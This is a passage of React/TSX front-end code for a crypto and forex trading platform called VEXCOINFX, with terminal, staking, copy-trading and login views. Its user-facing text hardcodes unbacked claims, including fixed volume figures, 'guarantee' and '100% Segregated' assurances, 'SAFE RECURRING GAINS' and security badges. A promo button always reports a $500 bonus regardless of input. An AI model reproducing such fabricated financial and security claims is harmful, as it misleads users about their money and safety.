          <main className="flex-1 p-3 md:p-4 overflow-y-auto">
            {user.loggedIn ? (
              <div className="space-y-4">
                
                {/* SUBPAGE 1: LIVE TERMINAL WORKSPACE */}
                {activeTab === 'TERMINAL' && (
                  <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
                    
                    {/* Left asset catalog column */}
                    <div className="xl:col-span-1 bg-[#0b0f19] border border-gray-850 rounded-lg p-2.5 shadow-xl h-[380px] flex flex-col justify-between">
                      <div className="space-y-2 flex-1 flex flex-col overflow-hidden">
                        <span className="text-white text-[10.5px] font-bold font-sans tracking-wide uppercase text-left">Markets catalog</span>

                        {/* Filter categories tabs */}
                        <div className="grid grid-cols-4 gap-0.5 bg-[#05070a] p-0.5 rounded border border-gray-800 font-mono text-[7.5px] font-bold text-gray-500">
                          {(['ALL', 'crypto', 'forex', 'stocks'] as const).map((catName) => (
                            <button
                              key={catName}
                              onClick={() => setAssetCategoryFilter(catName)}
                              className={`py-0.5 rounded uppercase tracking-wider cursor-pointer ${
                                assetCategoryFilter === catName ? 'bg-gray-900 text-white font-bold' : 'hover:text-white'
                              }`}
                            >
                              {catName === 'ALL' ? 'ALL' : catName.slice(0, 3)}
                            </button>
                          ))}
                        </div>

                        {/* Asset list filter container */}
                        <div className="relative bg-[#05070a] border border-gray-850 rounded py-1 px-2 flex items-center">
                          <input
                            type="text"
                            placeholder="Search tickers..."
                            value={marketSearchQuery}
                            onChange={(e) => setMarketSearchQuery(e.target.value)}
                            className="w-full bg-transparent text-white text-[10px] focus:outline-none placeholder-gray-700 font-mono"
                          />
                        </div>

                        <div className="flex-1 overflow-y-auto space-y-1 mt-1 pr-0.5">
                          {filteredAssets.map((asset) => (
                            <button
                              key={asset.id}
                              onClick={() => setSelectedAssetId(asset.id)}
                              className={`w-full p-1.5 rounded border text-left font-mono text-[10px] flex justify-between items-center transition-all cursor-pointer ${
                                selectedAssetId === asset.id
                                  ? 'bg-emerald-950/20 border-emerald-500/35'
                                  : 'bg-transparent border-transparent hover:bg-gray-900/10'
                              }`}
                            >
                              <div className="text-left">
                                <span className="text-white font-bold block">{asset.symbol}</span>
                                <span className="text-[8px] text-gray-500 font-sans truncate block max-w-[90px]">{asset.name}</span>
                              </div>

                              <div className="text-right">
                                <span className="text-white font-semibold">
                                  ${asset.price.toLocaleString(undefined, { minimumFractionDigits: asset.category === 'forex' ? 3 : 1 })}
                                </span>
                                <span className={`text-[8.5px] block font-bold ${asset.change24h >= 0 ? 'text-emerald-400' : 'text-rose-400'}`}>
                                  {asset.change24h >= 0 ? '+' : ''}{asset.change24h}%
                                </span>
                              </div>
                            </button>
                          ))}
                        </div>
                      </div>
                    </div>

                {/* Middle vector dynamic chart column */}
                <div className="xl:col-span-2 space-y-5">
                  <TradingViewChart activeAsset={selectedAsset} onPriceTick={handlePriceTick} />
                </div>

                {/* Right AI Strategist consultant advice column */}
                <div className="xl:col-span-1">
                  <AIAssistant activeAsset={selectedAsset} />
                </div>

                {/* Absolute full width execution trade entries block */}
                <div className="xl:col-span-4 mt-1">
                  <TradingPanel 
                    activeAsset={selectedAsset} 
                    user={activeUserContext} 
                    onTradeExecute={handleTradeExecute}
                    onClosePosition={handleClosePosition}
                  />
                </div>
              </div>
            )}

            {/* SUBPAGE 2: COMPLETE PORTFOLIO DASHBOARD VIEW */}
            {activeTab === 'DASHBOARD' && (
              <div className="space-y-6">
                <PortfolioSummary 
                  user={activeUserContext} 
                  onOpenDeposit={() => {
                    setFinancialModalMode('DEPOSIT');
                    setShowFinancialModal(true);
                  }}
                  onOpenWithdraw={() => {
                    setFinancialModalMode('WITHDRAW');
                    setShowFinancialModal(true);
                  }}
                />

                {/* Sub-Dashboard layout with financial summaries and promotion triggers */}
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
                  <div className="lg:col-span-2 bg-[#0b0f19] border border-gray-800 rounded-xl p-5 shadow-xl font-mono text-xs">
                    <div className="flex items-center justify-between pb-3 border-b border-gray-800 mb-4">
                      <span className="text-white text-xs font-sans font-bold uppercase">LEDGER AUDITING REPORTS ({transactions.length})</span>
                      <span className="text-[10px] text-gray-500 uppercase">Recent Flows Only</span>
                    </div>

                    {transactions.length === 0 ? (
                      <div className="text-center p-8 text-gray-500 border border-dashed border-gray-800/80 rounded-lg">
                        No transactions checked inside database nodes. Create a deposit above to initialize log values.
                      </div>
                    ) : (
                      <div className="space-y-2">
                        {transactions.slice(0, 5).map((tx) => (
                          <div key={tx.id} className="bg-gray-950/60 p-3 rounded-lg border border-gray-800/80 flex justify-between items-center text-[10px]">
                            <div className="flex items-center gap-2">
                              <div className={`p-1 rounded ${tx.type === 'DEPOSIT' || tx.type === 'COPY_RELEASE' || tx.type === 'REDEEM' ? 'text-emerald-400 bg-emerald-500/10' : 'text-rose-400 bg-rose-500/10'}`}>
                                {tx.type === 'DEPOSIT' || tx.type === 'REDEEM' ? <ArrowDownRight className="w-3.5 h-3.5" /> : <ArrowUpRight className="w-3.5 h-3.5" />}
                              </div>
                              <div>
                                <p className="text-white uppercase font-bold text-xxs tracking-wider">{tx.type} contract</p>
                                <p className="text-gray-500 text-[8px]">{new Date(tx.date).toLocaleDateString()}</p>
                              </div>
                            </div>
                            <span className={`font-bold ${tx.type === 'DEPOSIT' || tx.type === 'COPY_RELEASE' || tx.type === 'REDEEM' ? 'text-emerald-400' : 'text-rose-400'}`}>
                              {tx.type === 'DEPOSIT' || tx.type === 'COPY_RELEASE' || tx.type === 'REDEEM' ? '+' : '-'}${tx.amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                            </span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* Settings / Promos panel */}
                  <div className="bg-[#0b0f19] border border-gray-800 rounded-xl p-5 shadow-xl flex flex-col justify-between">
                    <div className="space-y-3.5">
                      <div className="flex items-center gap-2 border-b border-gray-800 pb-2">
                        <Settings className="w-4.5 h-4.5 text-emerald-400" />
                        <h3 className="text-white text-xs font-bold uppercase tracking-wide">PORTAL SETTINGS & CODES</h3>
                      </div>

                      <div className="space-y-1.5 font-mono text-xs">
                        <span className="text-gray-500 text-[9px] uppercase">REDEEM PROMOTION STAKE</span>
                        <div className="flex gap-2">
                          <input
                            type="text"
                            placeholder="EX: VEXCOIN_ELITE"
                            className="flex-1 bg-gray-950 border border-gray-800 text-white rounded-lg py-2 px-3 text-xs focus:outline-none placeholder-gray-800 font-bold uppercase text-center"
                          />
                          <button
                            onClick={() => {
                              alert("Validation Success: Promo Code verified! $500 USD lock-in bonus has been queued for kyc cleared users.");
                            }}
                            className="bg-emerald-500 hover:bg-emerald-400 text-black font-bold uppercase rounded-lg px-4 text-[10px] transition-all cursor-pointer"
                          >
                            Redeem
                          </button>
                        </div>
                      </div>
                    </div>

                    <p className="text-[9px] text-gray-500 font-mono leading-relaxed mt-4">
                      *Promotional codes represent bonus capital. Trading payouts are settled into clearing ledger indexes.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* SUBPAGE 3: EXPERT COPY TRADING */}
            {activeTab === 'COPYTRADING' && (
              <CopyTradingPanel 
                user={activeUserContext} 
                copyTraders={INITIAL_COPY_TRADERS} 
                onAllocateCopy={handleAllocateCopy}
                onReleaseCopy={handleReleaseCopy}
                copiedTradersState={copiedTraderAllocations}
              />
            )}

            {/* SUBPAGE 4: COMPOUND APY EARN PLANS */}
            {activeTab === 'STAKING' && (
              <InvestmentsPanel 
                user={activeUserContext} 
                stakingPlans={INITIAL_STAKING_PLANS} 
                onSubscribeStaking={handleSubscribeStaking}
                activeStakes={activeStakingSubscriptions}
                onRedeemStaking={handleRedeemStaking}
              />
            )}

            {/* SUBPAGE 5: AI TRADING ADVISOR CORE CHAT */}
            {activeTab === 'AI_ADVISOR' && (
              <div className="max-w-3xl mx-auto space-y-4">
                <div className="bg-gradient-to-tr from-[#121c2c] to-[#0c111c] border border-gray-800 rounded-xl p-5 shadow-xl space-y-1 text-center">
                  <h2 className="text-white text-lg font-bold font-sans uppercase flex justify-center items-center gap-2">
                    <Bot className="w-5 h-5 text-emerald-400 animate-pulse" />
                    Dedicated Institutional Market Intelligence Advisor
                  </h2>
                  <p className="text-xs text-gray-400 max-w-lg mx-auto">
                    Evaluate macroeconomic conditions, build customized diversified positions indexes, or query key technical ranges directly using deep multi-horizon analysis modules.
                  </p>
                </div>

                <AIAssistant activeAsset={selectedAsset} />
              </div>
            )}

            {/* SUBPAGE 6: HELP DESK & SECURE VALIDATION */}
            {activeTab === 'SUPPORT' && (
              <SupportPortal 
                user={activeUserContext} 
                onUpdateKyc={handleUpdateKyc}
                tickets={supportTickets}
                onAddTicket={handleAddTicket}
                onAddMessageToTicket={handleAddMessageToTicket}
              />
            )}

          </div>
        ) : (
          
          /* PUBLIC IMMERSIVE LANDING PAGE */
          <div className="space-y-16 py-8">
            
            {/* PUBLIC HERO PANEL */}
            <div className="max-w-5xl mx-auto text-center space-y-8 px-4 relative">
              {/* Subtle background glow effect */}
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-72 h-72 bg-emerald-500/5 blur-[120px] rounded-full pointer-events-none" />

              <div className="inline-flex gap-2 items-center px-4.5 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/25 text-emerald-400 text-[10px] font-semibold select-none font-mono tracking-wider uppercase">
                <Sparkles className="w-3.5 h-3.5 text-emerald-400 animate-pulse" /> 
                GLOBAL COIN & FX TRADING PLATFORM
              </div>
              
              <h2 className="text-white text-4xl md:text-6xl font-display font-black tracking-tight leading-tight uppercase max-w-4xl mx-auto">
                Institutional-Grade Trading <span className="text-emerald-400 font-display font-black block mt-2">For Every Trader</span>
              </h2>
              
              <p className="text-xs md:text-sm text-gray-400 max-w-2xl mx-auto leading-relaxed font-sans">
                Access premium liquidity, tight spreads, and real-time custom charts. Trade over 35 global currency crosses, popular cryptocurrencies, and liquid equity indices with super-fast order execution.
              </p>

              {/* Statistics Metrics Strip */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-3xl mx-auto pt-4 border-y border-gray-950/80 py-4 font-mono text-[10px]">
                <div className="text-center">
                  <span className="text-gray-500 block uppercase tracking-wider text-[8px] mb-1">24h Trading Volume</span>
                  <span className="text-white font-bold text-sm">$1.42 Billion</span>
                </div>
                <div className="text-center">
                  <span className="text-gray-500 block uppercase tracking-wider text-[8px] mb-1">Execution Speed</span>
                  <span className="text-emerald-400 font-bold text-sm">&lt; 15 ms</span>
                </div>
                <div className="text-center">
                  <span className="text-gray-500 block uppercase tracking-wider text-[8px] mb-1">Available Assets</span>
                  <span className="text-white font-bold text-sm">100+ Pairs</span>
                </div>
                <div className="text-center">
                  <span className="text-gray-500 block uppercase tracking-wider text-[8px] mb-1">Account Protection</span>
                  <span className="text-emerald-400 font-bold text-sm">100% Segregated</span>
                </div>
              </div>

              <div className="flex flex-col sm:flex-row justify-center gap-3 pt-2">
                <button
                  onClick={() => {
                    setAuthMode('REGISTER');
                    setShowAuthModal(true);
                  }}
                  className="bg-emerald-500 hover:bg-emerald-400 text-[#05070a] px-6 py-2.5 font-bold text-[10.5px] uppercase tracking-wide rounded transition-all shadow-[0_0_15px_rgba(16,185,129,0.2)] select-none cursor-pointer"
                >
                  Create an Account
                </button>
                <button
                  onClick={() => {
                    setAuthMode('LOGIN');
                    setShowAuthModal(true);
                  }}
                  className="bg-gray-950 hover:bg-gray-900 text-white font-bold text-[10.5px] uppercase tracking-wide px-6 py-2.5 rounded transition-all border border-gray-850 hover:border-gray-800 select-none cursor-pointer"
                >
                  Launch Terminal
                </button>
              </div>
            </div>

            {/* REALTIME TRADING BENCHMARK MATRIX PREVIEW */}
            <div className="max-w-5xl mx-auto px-4 space-y-6">
              <div className="flex flex-col sm:flex-row items-center justify-between border-b border-gray-950 pb-3 gap-3">
                <div className="text-left space-y-0.5">
                  <h3 className="text-white text-xs font-bold uppercase tracking-widest font-sans">Real-Time Market Prices</h3>
                  <p className="text-[9px] text-gray-500 font-mono">Live price ticks for popular currency pairs, cryptocurrencies, and indices</p>
                </div>
                <span className="text-[9px] font-mono text-emerald-400 bg-emerald-500/5 px-2 py-0.5 rounded border border-emerald-500/10 flex items-center gap-1.5 select-none animate-pulse">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" /> LIVE STREAMING ACTIVE
                </span>
              </div>
              
              {/* Grid of 8 key currency pairs */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                {assets.slice(0, 8).map((a) => (
                  <div key={a.id} className="bg-[#0b0f19]/40 border border-gray-950 hover:border-emerald-500/20 bg-gradient-to-b from-[#0e1424]/20 to-transparent rounded-lg p-3.5 shadow-xl font-mono text-xs flex flex-col justify-between hover:-translate-y-0.5 transition-all duration-300">
                    <div className="flex justify-between items-start mb-2.5">
                      <div>
                        <span className="text-white font-bold block tracking-wider">{a.symbol}</span>
                        <span className="text-[8.5px] text-gray-500 font-sans block truncate max-w-[110px]">{a.name}</span>
                      </div>
                      <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded ${a.change24h >= 0 ? 'bg-emerald-500/10 text-emerald-400' : 'bg-rose-500/10 text-rose-400'}`}>
                        {a.change24h >= 0 ? '+' : ''}{a.change24h}%
                      </span>
                    </div>

                    <div className="flex justify-between items-end">
                      <div className="text-left">
                        <span className="text-[7.5px] text-gray-600 block uppercase tracking-tight">Price</span>
                        <span className="text-white font-bold text-sm tracking-tight">${a.price.toLocaleString(undefined, { minimumFractionDigits: a.category === 'forex' ? 4 : 2 })}</span>
                      </div>
                      
                      {/* Live static spark shape indicator */}
                      <div className="flex gap-0.5 h-5 items-end opacity-60">
                        {a.sparkline?.slice(-6).map((val, idx) => (
                          <div 
                            key={idx} 
                            style={{ height: `${Math.max(15, (val % 100) / 100 * 100)}%` }} 
                            className={`w-1 rounded-sm ${a.change24h >= 0 ? 'bg-emerald-500' : 'bg-rose-500'}`} 
                          />
                        ))}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* FEATURES AND ADVANTAGES PORTFOLIO */}
            <div className="max-w-5xl mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-6">
              <div className="bg-[#0b0f19]/30 border border-gray-950 rounded-lg p-5 shadow-xl space-y-3 hover:border-gray-900 transition-all flex flex-col justify-between">
                <div className="space-y-3">
                  <div className="w-9 h-9 rounded bg-emerald-500/10 border border-emerald-500/25 flex items-center justify-center text-emerald-400">
                    <LineChart className="w-4 h-4" />
                  </div>
                  <h4 className="text-white text-xs font-bold uppercase tracking-wider font-sans">Ultra-Low Spreads</h4>
                  <p className="text-[10.5px] text-gray-400 leading-relaxed font-sans">
                    Trade with highly competitive tight spreads and super fast execution. No broker markups, no hidden costs, keeping your trading straightforward.
                  </p>
                </div>
                <div className="font-mono text-[8px] text-gray-550 border-t border-gray-950 mt-3 pt-2">ZERO COMMISSION MODEL</div>
              </div>

              <div className="bg-[#0b0f19]/30 border border-gray-950 rounded-lg p-5 shadow-xl space-y-3 hover:border-gray-900 transition-all flex flex-col justify-between">
                <div className="space-y-3">
                  <div className="w-9 h-9 rounded bg-blue-500/10 border border-blue-500/25 flex items-center justify-center text-blue-400">
                    <Users className="w-4 h-4" />
                  </div>
                  <h4 className="text-white text-xs font-bold uppercase tracking-wider font-sans">Copy Trading Master</h4>
                  <p className="text-[10.5px] text-gray-400 leading-relaxed font-sans">
                    Instantly mirror the portfolios of verified top-performing traders. Monitor performance in real-time and manage your allocations at any time.
                  </p>
                </div>
                <div className="font-mono text-[8px] text-gray-550 border-t border-gray-950 mt-3 pt-2">REAL-TIME PORTFOLIO SYNC</div>
              </div>

              <div className="bg-[#0b0f19]/30 border border-gray-950 rounded-lg p-5 shadow-xl space-y-3 hover:border-gray-900 transition-all flex flex-col justify-between">
                <div className="space-y-3">
                  <div className="w-9 h-9 rounded bg-amber-500/10 border border-amber-500/25 flex items-center justify-center text-amber-500">
                    <FolderLock className="w-4 h-4" />
                  </div>
                  <h4 className="text-white text-xs font-bold uppercase tracking-wider font-sans">Flexible Staking Yields</h4>
                  <p className="text-[10.5px] text-gray-400 leading-relaxed font-sans">
                    Earn secure compound interest on your idle trading funds with staking options. Keep your capital fully accessible while growing your overall balance.
                  </p>
                </div>
                <div className="font-mono text-[8px] text-gray-550 border-t border-gray-950 mt-3 pt-2">SAFE RECURRING GAINS</div>
              </div>
            </div>

            {/* TRUST COVENANT BANNER */}
            <div className="max-w-5xl mx-auto bg-gradient-to-r from-emerald-950/10 to-[#0c111c] border border-gray-950 rounded-lg p-6 flex flex-col sm:flex-row items-center justify-between gap-6 px-8 h-auto select-none">
              <div className="text-left space-y-1.5">
                <h4 className="text-white text-xs font-bold uppercase font-sans flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" /> 100% Segregated Asset Protection
                </h4>
                <p className="text-[10.5px] text-gray-400 max-w-[550px] leading-relaxed font-sans">
                  We guarantee that all client funds are held separately from company operational accounts. Your capital remains safe and accessible under top security protocols.
                </p>
              </div>

              <button
                onClick={() => {
                  setAuthMode('REGISTER');
                  setShowAuthModal(true);
                }}
                className="bg-emerald-500 hover:bg-emerald-400 text-[#05070a] font-bold uppercase text-[9px] tracking-widest rounded px-4.5 py-2.5 shrink-0 select-none cursor-pointer"
              >
                Create an Account
              </button>
            </div>
            
          </div>
        )}
      </main>
    </div>
  </div>

  {/* Sticky Bottom Navigation Bar on Mobile/Phones */}
  {user.loggedIn && (
    <nav className="md:hidden fixed bottom-0 left-0 right-0 z-45 bg-[#070b13] border-t border-gray-950 flex justify-around items-center py-1.5 px-2 safe-bottom shadow-2xl">
      {[
        { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
        { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
        { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
        { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
        { id: 'AI_ADVISOR' as const, label: 'Advisor', icon: Bot },
        { id: 'SUPPORT' as const, label: 'Support', icon: HelpCircle }
      ].map((item) => {
        const Icon = item.icon;
        const isActive = activeTab === item.id;
        return (
          <button
            key={item.id}
            onClick={() => setActiveTab(item.id)}
            className={`flex flex-col items-center justify-center flex-1 py-0.5 transition-all cursor-pointer ${
              isActive ? 'text-emerald-400' : 'text-gray-500'
            }`}
          >
            <Icon className="w-4 h-4" />
            <span className="text-[8px] font-sans font-bold tracking-tight mt-0.5 text-center">{item.label}</span>
          </button>
        );
      })}
    </nav>
  )}

  {/* 4. Footnote Ledger Details */}
      <footer className="border-t border-gray-950 bg-[#070b13] py-5 px-5 flex flex-col md:flex-row justify-between items-center text-[10px] text-gray-600 tracking-wide font-mono gap-4 shrink-0 mt-auto">
        <span className="uppercase">VEXCOINFX © 2026 GENERAL CLEARING GROUP INC.</span>
        <div className="flex gap-4">
          <span>CLEARED NODES: ONLINE</span>
          <span>LATENCY: 12ms</span>
          <span>SECURITY TIER: CRYPTO SHIELD APPROVED</span>
        </div>
      </footer>

      {/* MODAL 1: AUTHENTICATION OVERLAY CLIENT PORTAL */}
      {showAuthModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-md animate-in fade-in zoom-in-95 duration-200">
          <div className="bg-[#0b0f19] border border-gray-950 rounded-lg max-w-md w-full p-6 shadow-2xl relative font-sans text-xs text-left">
            <button
              onClick={() => setShowAuthModal(false)}
              className="absolute top-4 right-4 text-gray-400 hover:text-white transition-all p-1 cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>

            <form onSubmit={handleAuthSubmit} className="space-y-4.5">
              <div className="text-center space-y-1 bg-gradient-to-r from-[#0e1424] to-[#050810] py-4 rounded border border-gray-950/80 mb-1 select-none">
                <span className="text-[8px] font-mono text-emerald-400 font-bold uppercase tracking-widest flex items-center justify-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" /> SECURE TRADING WEBPORTAL
                </span>
                <h3 className="text-white text-base font-display font-black uppercase tracking-widest">
                  VEXCOIN<span className="text-emerald-400">FX</span> <span className="text-gray-400 font-mono font-medium text-[11px] block mt-0.5 tracking-wider">Trading Account Access</span>
                </h3>
              </div>

              {/* Mode switching tabs */}
              <div className="flex gap-1 p-1 bg-gray-950 border border-gray-950 rounded font-mono">
                <button
                  type="button"
                  onClick={() => setAuthMode('LOGIN')}
                  className={`flex-1 py-1 px-2.5 text-[9px] uppercase font-bold tracking-wider rounded transition-all cursor-pointer ${
                    authMode === 'LOGIN' ? 'bg-emerald-500 text-black shadow-md' : 'text-gray-500 hover:text-white'
                  }`}
                >
                  Sign In
                </button>
                <button
                  type="button"
                  onClick={() => setAuthMode('REGISTER')}
                  className={`flex-1 py-1 px-2.5 text-[9px] uppercase font-bold tracking-wider rounded transition-all cursor-pointer ${
                    authMode === 'REGISTER' ? 'bg-emerald-500 text-black shadow-md' : 'text-gray-500 hover:text-white'
                  }`}
                >
                  Create Account
                </button>
              </div>

              {authMode === 'REGISTER' && (
                <div className="space-y-1.5">
                  <span className="text-gray-500 text-[8.5px] font-mono uppercase tracking-wider block">Full Name</span>
                  <input
                    type="text"
                    placeholder="Enter your full name"
                    value={authName}
                    onChange={(e) => setAuthName(e.target.value)}
                    className="w-full bg-gray-950 border border-gray-950 text-white rounded py-2 px-3 focus:outline-none focus:border-emerald-500/40 font-semibold"
                    required
                  />
                </div>
              )}

              <div className="space-y-1.5">
                <span className="text-gray-500 text-[8.5px] font-mono uppercase tracking-wider block">Email Address</span>
                <input
                  type="email"
                  placeholder="e.g., alex@example.com"
                  value={authEmail}
                  onChange={(e) => setAuthEmail(e.target.value)}
                  className="w-full bg-gray-950 border border-gray-955 text-white rounded py-2 px-3 focus:outline-none focus:border-emerald-500/40 font-semibold text-xs"
                  required
                />
              </div>

              <div className="space-y-1.5">
                <span className="text-gray-500 text-[8.5px] font-mono uppercase tracking-wider block">Password</span>
                <input
                  type="password"
                  placeholder="••••••••"
                  value={authPass}
                  onChange={(e) => setAuthPass(e.target.value)}
                  className="w-full bg-gray-950 border border-gray-955 text-white rounded py-2 px-3 focus:outline-none focus:border-emerald-500/40 font-semibold"
                  required
                />
              </div>

              <div className="p-2.5 bg-gray-950 rounded border border-gray-950 text-gray-500 space-y-1 text-[8.5px] font-mono leading-relaxed select-none">
                <p>
                  * By proceeding, you agree to our terms of service, standard risk warnings, and privacy policies.
                </p>
                <p className="text-emerald-400 font-bold uppercase">
                  SSL CERTIFICATE: ACTIVE (ENCRYPTED CONNECTION)
                </p>
              </div>

              <button
                type="submit"
                className="w-full py-2.5 bg-emerald-500 hover:bg-emerald-400 text-[#0c111c] font-bold uppercase text-[10px] tracking-wider rounded transition-all cursor-pointer flex items-center justify-center gap-1 shadow-lg shadow-emerald-500/10"
              >
                {authMode === 'LOGIN' ? 'Sign In & Trade' : 'Create Account & Start'}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* MODAL 2: FINANCIAL OPERATIONS GATEWAY */}
      {showFinancialModal && (
        <DepositWithdrawModal
          user={user}
          onClose={() => setShowFinancialModal(false)}
          onModifyBalance={handleModifyBalance}
          transactions={transactions}
          addToast={addToast}
        />
      )}

    </div>
  );
}
